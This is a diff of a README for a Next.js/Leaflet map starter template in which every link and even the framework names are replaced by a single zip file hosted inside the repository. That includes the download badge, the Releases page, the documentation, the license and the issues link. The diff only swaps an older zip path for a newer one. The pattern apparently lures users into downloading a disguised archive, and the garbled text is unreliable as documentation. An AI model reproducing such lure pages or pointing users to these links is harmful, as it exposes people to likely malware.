@@ -1,10 +1,10 @@
 # 🗺️ nextjs-leaflet-starter - Build Interactive Map Applications Easily
 
-[![Download](https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip)
+[![Download](https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip%20Now-Here-brightgreen)](https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip)
 
 ## 📦 Overview
 
-nextjs-leaflet-starter is a https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip starter template designed for building interactive map applications. It features seamless integration with vanilla Leaflet, providing users with a modern, Google Maps-inspired user interface. This template simplifies the process of creating map applications, making it suitable for both beginners and experienced developers.
+nextjs-leaflet-starter is a https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip starter template designed for building interactive map applications. It features seamless integration with vanilla Leaflet, providing users with a modern, Google Maps-inspired user interface. This template simplifies the process of creating map applications, making it suitable for both beginners and experienced developers.
 
 ## 🚀 Getting Started
 
@@ -15,13 +15,13 @@ To get started with nextjs-leaflet-starter, follow the simple steps below. You w
 Before downloading, make sure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip** Version 16 or higher
+- **https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip** Version 16 or higher
 - **Internet Connection:** Required for downloading packages and assets
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    Look for the most recent release. Click on it to view the available files.
@@ -52,22 +52,22 @@ Before downloading, make sure your system meets these requirements:
 
 - **Interactive Maps:** Easily integrate interactive maps using Leaflet.
 - **Google Maps-like UI:** Enjoy a user-friendly interface similar to Google Maps.
-- **https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip Framework:** Utilize an efficient framework that enhances performance and SEO.
+- **https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip Framework:** Utilize an efficient framework that enhances performance and SEO.
 - **Customizable Styles:** Modify the look and feel of your map to fit your project.
 - **Responsive Design:** The application looks great on both web and mobile devices.
 - **Easy Installation:** Set up your project quickly with minimal configuration.
 
 ## 🌟 Why Use nextjs-leaflet-starter?
 
-This starter template allows users to focus on building functionality rather than setting up infrastructure. It combines the power of https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip and Leaflet, providing a strong foundation for map applications.
+This starter template allows users to focus on building functionality rather than setting up infrastructure. It combines the power of https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip and Leaflet, providing a strong foundation for map applications.
 
 ## 💻 Learning Resources
 
-If you are new to https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip or Leaflet, consider checking out the following resources:
+If you are new to https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip or Leaflet, consider checking out the following resources:
 
-- [https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip Documentation](https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip)
-- [Leaflet Documentation](https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip)
-- [Web Development Basics](https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip)
+- [https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip Documentation](https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip)
+- [Leaflet Documentation](https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip)
+- [Web Development Basics](https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip)
 
 These resources provide valuable information that can help you understand the frameworks and improve your application.
 
@@ -80,14 +80,14 @@ If you have questions or need assistance, consider reaching out to community for
 - Boilerplate for easy setup
 - Google Maps functionality using Leaflet
 - Map visualization techniques
-- Responsive web design with https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip
+- Responsive web design with https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip
 - Integrations with ShadCN UI for enhanced user experience
 
 ## 📝 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip). Feel free to use, modify, and distribute the code as you like.
+This project is licensed under the [MIT License](https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip). Feel free to use, modify, and distribute the code as you like.
 
 ## 🔗 Quick Links
 
-- [Releases Page](https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip) - Visit this page to download
-- [Project Issues](https://raw.githubusercontent.com/CharltonBB/nextjs-leaflet-starter/main/hooks/nextjs-leaflet-starter-1.6.zip) - Report issues or feature requests
+- [Releases Page](https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip) - Visit this page to download
+- [Project Issues](https://github.com/CharltonBB/nextjs-leaflet-starter/raw/refs/heads/main/types/starter-nextjs-leaflet-3.5-beta.3.zip) - Report issues or feature requests
